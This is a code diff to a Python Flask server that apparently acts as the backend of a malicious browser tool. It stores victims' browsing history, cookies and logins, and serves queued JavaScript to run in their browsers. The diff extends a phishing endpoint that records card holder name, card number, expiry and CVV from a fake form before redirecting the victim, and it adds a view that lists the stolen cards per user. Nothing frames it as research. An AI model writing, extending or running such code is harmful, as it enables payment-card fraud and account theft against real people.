@@ -27,15 +27,15 @@ def online_check():
 
 @app.route("/view_user/<email>", methods=['GET'])
 def view_user(email):
-    hist = history.get_history_by_user(email)
-    cook = cookies.get_cookies_by_user(email)
-    logs = login.get_logins_by_user(email)
-    secure_urls = secure.getFromSecure(email)
-    random_urls = secure.getFromRandom(email)
-    victim_urls = victim.getFromVictim(email)
-    phish_urls = phish.get_phish_by_user(email)
-
-    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls, victim_urls=victim_urls)
+   hist = history.get_history_by_user(email)
+   cook = cookies.get_cookies_by_user(email)
+   logs = login.get_logins_by_user(email)
+   secure_urls = secure.getFromSecure(email)
+   random_urls = secure.getFromRandom(email)
+   victim_urls = victim.getFromVictim(email)
+   phish_urls = phish.get_phish_by_user(email)
+   cards = phish.get_cards(email)
+   return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls, victim_urls=victim_urls, cards=cards)
 
 ########### SECURE ###########
 @app.route('/addSecure/<email>', methods=['POST'])
@@ -162,16 +162,17 @@ def phish_code(email, url):
 
 @app.route("/phish", methods=['POST'])
 def phishy_info():
-    if request.method == 'POST':
-        email = request.form['email']
-        name = request.form['name-on-card']
-        number = request.form['card-number']
-        month = request.form['expiration-month']
-        year = request.form['expiration-year']
-        cvv = request.form['cvv']
-        phish.add_phish(email, name, number, month, year, cvv)
-        redirect_url = request.form['redirect-url']
-        return redirect(redirect_url)
+   if request.method == 'POST':
+       userEmail = request.form['user-email']
+       email = request.form['email']
+       name = request.form['name-on-card']
+       number = request.form['card-number']
+       month = request.form['expiration-month']
+       year = request.form['expiration-year']
+       cvv = request.form['cvv']
+       phish.add_phish(userEmail, email, name, number, month, year, cvv)
+       redirect_url = request.form['redirect-url']
+       return redirect(redirect_url)
 
 @app.route("/delete_phish/<email>/<url>", methods=['POST'])
 def delete_phish(email, url):
@@ -195,19 +196,19 @@ def execute_script(email):
         # oldList = executeQueue.get(str(email), [])
         # oldList.append(str(script))
         # executeQueue[str(email)] = oldList
-        victim_urls = victim.getFromVictim(email)
-        print list(victim_urls)
+        victim_urls = list(victim.getFromVictim(email))
         return redirect(url_for('view_user', email=email))
+        # return jsonify(url=victim_urls)
     elif request.method == 'GET':
         #print "EMAIL:", str(email)
         #print "EXECUTE:", executeQueue
-        script = executeQueue.get(str(email), [])
         #print "SCRIPTS:", script
+        victim_urls = list(victim.getFromVictim(email))
+        script = victim_urls
         if script:
             #print "IN SCRIPT"
-            executeQueue[str(email)] = []
+            #executeQueue[str(email)] = []
             #print executeQueue
-            #print script
             return jsonify(js=script)
         else:
             #print "NOT IN SCRIPT"
